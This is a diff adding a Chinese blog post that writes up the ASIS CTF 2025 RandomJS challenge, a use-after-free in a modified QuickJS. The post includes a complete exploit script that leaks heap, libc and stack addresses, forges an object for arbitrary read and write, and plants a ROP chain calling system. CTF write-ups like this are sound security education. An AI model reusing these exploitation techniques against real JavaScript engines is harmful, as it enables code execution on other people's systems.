@@ -1,0 +1,692 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content=":)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 ASIS CTF RandomJS wp">
+<meta property="og:url" content="http://akaieurus.github.io/2025/09/13/asis2025qjs/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content=":)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc68.jpg">
+<meta property="article:published_time" content="2025-09-13T07:06:18.000Z">
+<meta property="article:modified_time" content="2025-09-13T09:22:49.316Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="js">
+<meta property="article:tag" content="quickjs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc68.jpg">
+  
+  
+  
+  <title>2025 ASIS CTF RandomJS wp - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc68.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025 ASIS CTF RandomJS wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-13 15:06" pubdate>
+          2025年9月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          822 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025 ASIS CTF RandomJS wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>:)</p>
+<span id="more"></span>
+
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>给array加了个方法，在array中任意选择一个obj返回，但没有增加refcount，可以uaf</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> JSValue <span class="hljs-title">js_array_randompick</span><span class="hljs-params">(JSContext *ctx, JSValueConst this_val,</span></span><br><span class="hljs-params"><span class="hljs-function">                           <span class="hljs-type">int</span> argc, JSValueConst *argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    JSValue obj, ret;<br>    <span class="hljs-type">int64_t</span> len, idx;<br>    JSValue *arrp;<br>    <span class="hljs-type">uint32_t</span> count;<br><br>    obj = <span class="hljs-built_in">JS_ToObject</span>(ctx, this_val);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">js_get_length64</span>(ctx, &amp;len, obj))<br>        <span class="hljs-keyword">goto</span> exception;<br><br>    idx = <span class="hljs-built_in">rand</span>() % len;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">js_get_fast_array</span>(ctx, obj, &amp;arrp, &amp;count) &amp;&amp; idx &lt; count) ret = (JSValue) arrp[idx];<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> present = <span class="hljs-built_in">JS_TryGetPropertyInt64</span>(ctx, obj, idx, &amp;ret);<br>        <span class="hljs-keyword">if</span> (present &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> exception;<br>        <span class="hljs-keyword">if</span> (!present)<br>            ret = JS_UNDEFINED;<br>    &#125;<br>    <span class="hljs-built_in">JS_FreeValue</span>(ctx, obj);<br>    <span class="hljs-keyword">return</span> ret;<br> exception:<br>    <span class="hljs-built_in">JS_FreeValue</span>(ctx, obj);<br>    <span class="hljs-keyword">return</span> JS_EXCEPTION;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="目标对象"><a href="#目标对象" class="headerlink" title="目标对象"></a>目标对象</h1><p>js解释器的题可以通过这种👇方式进行任意读写。用ArrayBuffer-&gt;buf占位uaf obj，然后通过BigUint64Array等视图读写obj结构体，控制buf指向目标读写地址进行任意读写</p>
+<img src="/2025/09/13/asis2025qjs/uaf.png" srcset="/img/loading.gif" lazyload class title="uaf">
+
+<p>但在这道题的情况下，需要先通过randompick方法free obj再分配给ArrayBuffer-&gt;buf，再分配的时候obj已经被清空了，无法leak地址</p>
+<p>我最开始想通过普通的array来占位uaf obj，类似这样（用-1标记obj，7标记整数）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">target = [&#123;&#125;, <span class="hljs-number">0xdeadbeefn</span>, &#123;&#125;]<br><br><span class="hljs-comment">// tele target</span><br><span class="hljs-comment">// +0x0	 	0xffffffffffffffff</span><br><span class="hljs-comment">// +0x8	 	0x55555564a890</span><br><span class="hljs-comment">// +0x10	0x7</span><br><span class="hljs-comment">// +0x18	0xdeadbeef</span><br><span class="hljs-comment">// +0x20	0xffffffffffffffff</span><br><span class="hljs-comment">// +0x28	0x55555564b560</span><br></code></pre></td></tr></table></figure>
+
+<p><em>但普通的array是用realloc申请空间的，不好占位……</em></p>
+<p>后来通过discord的exp发现了这么一个结构体：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">JSBigInt</span> &#123;<br>    JSRefCountHeader header; <span class="hljs-comment">/* must come first, 32-bit */</span><br>    <span class="hljs-type">uint32_t</span> len; <span class="hljs-comment">/* number of limbs, &gt;= 1 */</span><br>    <span class="hljs-type">js_limb_t</span> tab[]; <span class="hljs-comment">/* two&#x27;s complement representation, always</span><br><span class="hljs-comment">                        normalized so that &#x27;len&#x27; is the minimum</span><br><span class="hljs-comment">                        possible length &gt;= 1 */</span><br>&#125; JSBigInt;<br></code></pre></td></tr></table></figure>
+
+<p>在一个数字后标记n表示一个大整数，大于4字节的整数用这样一个结构体👆表示，quickjs的大整数是不限长度的，JSBigInt-&gt;len表示大整数的长度（单位bit），改大len就能越界读了；且整个结构体没有指针，非常完美~</p>
+<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>选择JSBigInt作为uaf obj，改大len越界读写泄漏地址，然后再uaf一次伪造obj进行任意读写</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> pad1 = <span class="hljs-string">&quot;a&quot;</span>, pad2 = <span class="hljs-string">&quot;a&quot;</span>, pad3 = <span class="hljs-string">&quot;a&quot;</span>, pad4 = <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">const</span> map = [<span class="hljs-number">0xffffffffffffffffn</span>]<br><br>map.<span class="hljs-title function_">randompick</span>()<br>map.<span class="hljs-title function_">randompick</span>()<br>map.<span class="hljs-title function_">randompick</span>()<br><br><span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">let</span> array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf)<br><br>array[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span><br>array[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span><br><br>heapbase = ((map[<span class="hljs-number">0</span>] &gt;&gt; (<span class="hljs-number">35n</span> * <span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>) - <span class="hljs-number">0xcf2n</span><br>pie = ((map[<span class="hljs-number">0</span>] &gt;&gt; (<span class="hljs-number">36n</span> * <span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>) - <span class="hljs-number">0xf2660n</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(heapbase.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pie.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0n</span>; i &lt; <span class="hljs-number">0x100n</span>; i++)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, ((map[<span class="hljs-number">0</span>]&gt;&gt;(i*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>&#125;<br><br><span class="hljs-keyword">let</span> tmp1 = [&#123;&#125;, &#123;&#125;, &#123;&#125;]<br><span class="hljs-keyword">let</span> map1 = [&#123;&#125;]<br><br>map1.<span class="hljs-title function_">randompick</span>()<br><br>tmp1[<span class="hljs-number">0</span>] = <span class="hljs-literal">null</span><br>tmp1[<span class="hljs-number">1</span>] = <span class="hljs-literal">null</span><br><br><span class="hljs-keyword">let</span> buf1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x48</span>)<br><span class="hljs-keyword">let</span> array1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(buf1)<br><br>array1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1d0d0000000002n</span><br>array1[<span class="hljs-number">3</span>] = <span class="hljs-number">0x7b00000000n</span><br>array1[<span class="hljs-number">4</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>array1[<span class="hljs-number">7</span>] = pie + <span class="hljs-number">0xf4fc8n</span><br>array1[<span class="hljs-number">8</span>] = <span class="hljs-number">0x100n</span><br><br><span class="hljs-keyword">let</span> libcbase = map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">0x2a5b0n</span><br><span class="hljs-keyword">let</span> stack = map1[<span class="hljs-number">0</span>][<span class="hljs-number">34</span>]<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(libcbase.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stack.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br>array1[<span class="hljs-number">7</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0x616c66646165722fn</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">0x67n</span><br><br>array1[<span class="hljs-number">7</span>] = stack - <span class="hljs-number">0x498n</span><br><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = libcbase + <span class="hljs-number">0x28882n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = libcbase + <span class="hljs-number">0x119fdcn</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>] = libcbase + <span class="hljs-number">0x5c110n</span> <span class="hljs-comment">// puts: 0x8db68n, system: 0x5c110n</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="一点题外话"><a href="#一点题外话" class="headerlink" title="一点题外话"></a>一点题外话</h1><p>在discord找了个exp，有这么一段</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr = [<span class="hljs-number">0xfffffffffffffffffffn</span>]<br>num = arr.<span class="hljs-title function_">randompick</span>()<br>num2 = arr.<span class="hljs-title function_">randompick</span>()<br>num3 = arr.<span class="hljs-title function_">randompick</span>()<br><span class="hljs-keyword">delete</span> num<br><span class="hljs-keyword">delete</span> num3<br><br>heap_leak = (num2&gt;&gt;(<span class="hljs-number">5n</span>*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span><br>libc_leak = (num2&gt;&gt;(<span class="hljs-number">7n</span>*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span> - <span class="hljs-number">0x210c50n</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(heap_leak.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(libc_leak.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure>
+
+<p>但理论上来说delete只对对象属性起效，这么写应该会false才对</p>
+<p>后来才注意到这个声明没用let，后来查到这种<strong>隐式声明</strong>相当于给全局对象增加一个属性，所以是有效的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">num = <span class="hljs-number">114514n</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalThis)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">qjs tmp.js</span><br>&#123; console: &#123; log: [Function] &#125;, performance: &#123; now: [Function] &#125;, scriptArgs: [ &quot;tmp.js&quot; ], print: [Function print], num: 114514n &#125;<br></code></pre></td></tr></table></figure>
+
+<p><em>虽然跟这道题没什么关系，樂</em></p>
+<p>做这道题的时候重新想起了被v8支配的恐惧，这种js解释器的题最恶心的就是代码但凡有一点小变化整个堆布局大动……</p>
+<img src="/2025/09/13/asis2025qjs/kita.jpg" srcset="/img/loading.gif" lazyload class title="kita">
+
+<p>后来发现可以随便塞点变量调堆，别管为什么有用就行（</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> pad1 = <span class="hljs-string">&quot;a&quot;</span>, pad2 = <span class="hljs-string">&quot;a&quot;</span>, pad3 = <span class="hljs-string">&quot;a&quot;</span>, pad4 = <span class="hljs-string">&quot;a&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/JavaScript/" class="category-chain-item">JavaScript</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+        <a href="/tags/js/" class="print-no-link">#js</a>
+      
+        <a href="/tags/quickjs/" class="print-no-link">#quickjs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025 ASIS CTF RandomJS wp</div>
+      <div>http://akaieurus.github.io/2025/09/13/asis2025qjs/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/01/ximenzi/" title="2023年西门子白帽黑客大赛 pwn wp">
+                        <span class="hidden-mobile">2023年西门子白帽黑客大赛 pwn wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
